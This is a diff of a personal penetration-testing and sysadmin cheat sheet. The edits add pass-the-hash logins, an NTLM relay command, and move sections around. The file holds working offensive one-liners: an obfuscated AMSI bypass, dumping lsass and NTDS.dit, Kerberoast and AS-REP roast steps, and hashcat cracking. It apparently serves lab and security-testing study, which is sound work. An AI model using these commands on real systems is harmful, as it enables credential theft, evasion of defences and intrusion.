@@ -14,37 +14,25 @@ https://download.sysinternals.com/files/PSTools.zip
 PsExec64.exe -s -i "\full\path\to\exe\create-kernel-service.exe"
 ```
 
-
 // Allow remote logon to WinRM service (PowerShell) 
 ```
 New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -PropertyType "DWORD"
 ```
 -or-
 ```
-
 winrm quickconfig
 ```
 
 // xfreerdp - dynamic resolution, shared folder, ignore cert  
 ```
-xfreerdp /dynamic-resolution /cert:ignore /v:x.x.x.x /u:shellton /p:'spazzword' /drive:SHARE,<local file path>
+xfreerdp /dynamic-resolution /cert:ignore /v:x.x.x.x /u:someuser /p:'spazzword' /drive:SHARE,<local file path>
+xfreerdp /v:x.x.x.x /u:someuser /pth:xxxxxxxxxxxxxHASHxxxxxxxxxxxxxxx
 ```
 
 // evil-winrm
 ```
-evil-winrm -i x.x.x.x -u shellton -p spazzword -P 5985
-```
-
-// The Harvester  as Docker container  
-```  
-docker run --rm -it --mount type=bind,source="$HOME/.theHarvester/api-keys.yaml",target="/app/api-keys.yaml" --entrypoint "/root/.local/bin/theHarvester" theharvester -d linkedin.com -b all
-```  
--d : target domain
--b: data source  
-
-// h8mail  
-```  
-h8mail -t emails.txt
+evil-winrm -i x.x.x.x -u someuser -p spazzword -P 5985
+evil-winrm -i x.x.x.x -u vagrant -H xxxxxxxxxxxxxHASHxxxxxxxxxxxxxxx 
 ```
 
 // Impacket - Docker install
@@ -63,24 +51,14 @@ docker run -it --rm -v ~/Desktop/share:/shared impacket:latest
 ```
 impacket-lookupsid anonymous@10.10.10.10
 ```
+// Impacket - NTLM relay
+```
+impacket-ntlmrelayx -smb2support -t smb://10.10.10.10 -c 'whoami /all' -debug
+```
 
 // Impacket - ASREProast
 ```
 impacket-GetNPUsers contoso.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10
-```
-
-// AMSI bypass - https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/  
-```
-$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
-$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
-$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
-$field.SetValue($null,$true)
-```
-
-// Dump lsass using comsvcs.dll
-```
-tasklist /fi "imagename eq lsass.exe"
-rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <PID> lsass.dmp full 
 ```
 
 // Impacket - Create share  (not MacOS)
@@ -145,6 +123,19 @@ http/creds-harvestin.thm.red  svc-thm            2022-06-10 10:47:33.796826  <ne
 [-] CCache file is not found. Skipping...
 $krb5tgs$23$*svc-thm$THM.RED$THM.red/svc-thm*$...
 
+```
+// AMSI bypass - https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/  
+```
+$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
+$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
+$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
+$field.SetValue($null,$true)
+```
+
+// Dump lsass using comsvcs.dll
+```
+tasklist /fi "imagename eq lsass.exe"
+rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <PID> lsass.dmp full 
 ```
 
 // Ntdsutil - Dump NTDS.dit
@@ -292,15 +283,6 @@ hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 find / -type f -perm -04000 -ls 2>/dev/null
 ```
 
-// Get location of process - Windows  
-```powershell
-// old way
-wmic process where ProcessId=<process_id> get ExecutablePath
-
-// new way
-Get-Process -Id 11076 | Select-Object -ExpandProperty Path
-```
-
 // get capabilities  
 ```
 getcap -r / 2> /dev/null
@@ -347,43 +329,14 @@ getcap -r / 2> /dev/null
      GOARCH=amd64 GOOS=linux CGO_ENABLED=0 go build -o go-gobserver  
 
 // Initiate module for project - GoLang  
- 
+ ```
      go mod init foo  
-     
-// Set primary and secondary DNS - Windows  
- 
-     Get-NetAdapter  
-     Set-DnsClientServerAddress -InterfaceIndex <Interface Number> -ServerAddresses ("8.8.8.8","8.8.4.4")  
-     
-// Join to domain - Windows
- 
-     Add-Computer -DomainName <domain name>  
-     
-// Get current domain - Windows
- 
-     (Get-WmiObject Win32_ComputerSystem).Domain
-
+ ```
+    
 // Bloodhound  
 ```powershell  
 Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
 ```  
-
-// Get descriptions of domain users  
-```powershell   
-Get-ADUser -Filter * -Properties Description | 
-    Select-Object SamAccountName, Description
-```  
-
-// Get domain admins  
-```powershell    
-Get-ADGroupMember -Identity "Domain Admins" -Recursive | Select-Object SamAccountName
-```  
-
-// Find Keroastable acounts  
-```powershell  
-Get-ADUser -Filter { ServicePrincipalName -ne "$null" } -Properties ServicePrincipalName | 
-    Select-Object SamAccountName, ServicePrincipalName
-```
 
 // Linux command equivalents - Windows
 
@@ -420,14 +373,6 @@ Get-ADUser -Filter { ServicePrincipalName -ne "$null" } -Properties ServicePrinc
 
     sudo strings /sys/firmware/acpi/tables/MSDM
     
-// Windows key from Registry - Windows 11
-
-    Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ClipSVC\"
-
-// Windows key from Registry - Windows 10  
- 
-    Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform"
-
 // Add current user to vboxusers group - Linux
 
     sudo usermod -a -G vboxusers $USER
@@ -580,6 +525,17 @@ sudo dmidecode -t 1
 Fix borked sound - Linux  
 ```
 alsa force-reload
+```
+// The Harvester  as Docker container  
+```  
+docker run --rm -it --mount type=bind,source="$HOME/.theHarvester/api-keys.yaml",target="/app/api-keys.yaml" --entrypoint "/root/.local/bin/theHarvester" theharvester -d linkedin.com -b all
+```  
+-d : target domain
+-b: data source  
+
+// h8mail  
+```  
+h8mail -t emails.txt
 ```
 
 # Nmap notes  
